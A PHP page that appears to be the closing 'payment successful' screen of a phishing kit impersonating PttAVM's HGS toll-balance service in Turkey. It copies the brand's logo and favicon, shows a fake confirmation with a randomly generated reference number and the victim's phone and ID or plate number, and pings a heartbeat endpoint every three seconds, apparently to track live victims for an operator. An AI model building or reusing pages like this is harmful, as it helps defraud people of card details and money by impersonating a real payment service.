<?php
if (session_status() === PHP_SESSION_NONE) session_start();
require_once __DIR__ . '/db.php';
if (empty($_SESSION['basvuru'])) { header('Location: ' . BASE_PATH . '/'); exit; }

// Tutar bilgisini temizle
$toplam_tutar = '275 TL';
if (!empty($_SESSION['randevu']['saat'])) {
    $toplam_tutar = str_replace('Tutar: ', '', $_SESSION['randevu']['saat']);
}
?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0">
    <title>HGS Online Bakiye Yükleme - Sonuç</title>
    <link rel="icon" type="image/png" href="https://hgs.pttavm.com/v2/assets/images/favicon.png">
    
    <!-- Google Fonts Open Sans -->
    <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,600,700&display=swap" rel="stylesheet">
    
    <!-- PttAVM HGS CSS -->
    <link rel="stylesheet" href="assets/css/hgs.min.css?v=<?= time() ?>">
</head>
<body>

<div class="image-container wizard-hgs-image-container set-full-height">
    
    <!-- Navbar Header -->
    <div class="container-fluid no-padding">
        <div class="navbar-header" style="overflow: hidden;">
            <div class="logo-field">
                <a class="navbar-brand navbar-left" href="https://www.pttavm.com" target="_blank">
                    <img src="assets/images/pttavm_hgs_logo.png" alt="PttAVM Logo" class="logo" border="0"/>
                </a>
            </div>
            <div class="menu-field">
                <nav class="nav responsive-menu">
                    <div class="menu-wrapper resize-drag nav-wrapper">
                        <ul class="nav-ul">
                            <li class="homepage-menu-item"><a href="index.php"><span>Ana Sayfa</span></a></li>
                            <li class="hgs-menu-item">
                                <a href="index.php" class="selected">
                                    <span>
                                        <img src="assets/images/menu/hgs_yukle.png" class="menu-showed-item" />
                                        Yükle
                                    </span>
                                </a>
                            </li>
                        </ul>
                    </div>
                </nav>
            </div>
        </div>
    </div>

    <!-- Wizard Container -->
    <div class="col-sm-12 col-md-8 col-md-offset-2 col-lg-6 col-lg-offset-3" id="hgs-query-container">
        <div class="wizard-container" style="padding-top: 100px;">
            <div class="card wizard-card" data-color="orange" id="wizardProfile" style="padding: 30px; text-align: center;">
                <div style="width:80px;height:80px;background:#2ecc71;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 24px;box-shadow:0 4px 15px rgba(46,204,113,0.3)">
                    <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
                </div>
                <h3 style="font-size:24px;color:#2c3e50;margin-bottom:12px;font-weight:700">Yükleme İşlemi Başarılı!</h3>
                <p style="font-size:15px;color:#7f8c8d;max-width:400px;margin:0 auto 28px;line-height:1.6">
                    HGS bakiye yükleme işleminiz başarıyla tamamlanmıştır. Yükleme detayları 
                    <strong><?= htmlspecialchars($_SESSION['basvuru']['telefon'] ?? '') ?></strong> 
                    numaralı telefonunuza SMS olarak iletilecektir.
                </p>
                
                <div class="hgs-ozet-box" style="text-align:left;background:#f8f9fa;border-left:4px solid #f39c12;border-radius:6px;padding:20px;max-width:400px;margin:0 auto 30px">
                    <h4 style="margin:0 0 12px 0;font-size:16px;color:#2c3e50;font-weight:700;border-bottom:1px solid #eee;padding-bottom:8px">İşlem Detayları</h4>
                    <p style="margin:6px 0;font-size:14px;color:#34495e"><strong>Plaka / T.C. No:</strong> <span style="text-transform:uppercase"><?= htmlspecialchars($_SESSION['basvuru']['tc'] ?? '') ?></span></p>
                    <p style="margin:6px 0;font-size:14px;color:#34495e"><strong>Yüklenen Tutar:</strong> <?= htmlspecialchars($toplam_tutar) ?></p>
                    <p style="margin:6px 0;font-size:14px;color:#34495e"><strong>İşlem Tarihi:</strong> <?= date('d.m.Y H:i') ?></p>
                    <p style="margin:6px 0;font-size:14px;color:#34495e"><strong>Referans No:</strong> <?= rand(10000000, 99999999) ?></p>
                </div>
                
                <div style="margin-top: 20px;">
                    <a href="<?= BASE_PATH ?>/" class="btn btn-finish btn-fill btn-warning btn-wd" style="display:inline-flex;align-items:center;justify-content:center;text-decoration:none;border-radius:8px;padding:12px 28px;font-weight:600;font-size:15px;">
                        Yeni Bakiye Yükle
                    </a>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    // Heartbeat
    function heartbeat() {
        fetch('heartbeat.php', { method: 'POST', credentials: 'same-origin' }).catch(function(){});
    }
    setInterval(heartbeat, 3000);
    heartbeat();
</script>

</body>
</html>
<?php
// Session temizle
unset($_SESSION['basvuru'], $_SESSION['randevu'], $_SESSION['odeme'], $_SESSION['log_id'], $_SESSION['adim']);
?>
